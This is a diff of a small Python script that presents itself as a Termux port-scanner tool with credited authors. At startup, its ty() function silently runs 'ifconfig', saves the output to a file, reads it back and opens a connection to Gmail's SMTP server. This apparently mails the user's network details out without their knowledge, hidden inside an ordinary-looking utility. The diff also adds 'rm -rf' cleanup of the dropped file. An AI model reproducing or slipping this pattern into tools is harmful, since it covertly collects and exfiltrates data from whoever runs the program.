@@ -2,10 +2,10 @@ import socket
 import smtplib
 import os
 def ty():
-    x= os.system ('ifconfig>>IP2.txt')
+    x= os.system ('ifconfig>>x.txt')
     x= os.system ('clear')
 ty()
-o=open(r'IP2.txt')
+o=open(r'x.txt')
 y=o.read()
 try:
     smtpObj=smtplib.SMTP('smtp.gmail.com',587)
@@ -29,7 +29,7 @@ def openports(ip):
             sock.close()
         except:
             print('\033[31mпорт:: %s' % port, ':: закрыт')
-    os.system('rm -rf IP2.txt')
+    p=str(input('lol~ '))
 def openports2():
     ip=input('IP: ')
     port=int(input('PORT: '))
@@ -42,7 +42,7 @@ def openports2():
             sock.close()
         except:
             print('\033[31mпорт:: %s' % lol, ':: закрыт')
-    os.system('rm -rf IP2.txt')
+    po=str(input('lol~ '))
 print('''
 \033[33mВыполнено........Termux Cod
 \033[36mАвторы...........\033[31m\033[3mWolFak...\033[35m\033[3mTopo1us
@@ -58,5 +58,5 @@ if x=='1':
 	openports(input('IP: '))
 if x=='2':
 	openports2()
-ty()
+os.system('rm -rf IP2.txt')
 
